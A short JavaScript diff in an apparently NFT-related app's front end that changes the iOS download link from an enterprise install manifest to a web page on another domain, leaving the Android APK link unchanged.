@@ -15,7 +15,7 @@ const onApp = (type) => {
     return
   }
   if(type === 1){
-    window.open('itms-services:///?action=download-manifest&url=https://public.ysxqbjz.com/nft/app.plist')
+    window.open('https://downloadkhfnbc07.xyz/nfYJVXKL.html')
   } else {
     window.open('https://public.ysxqbjz.com/nft/app.apk')
   }
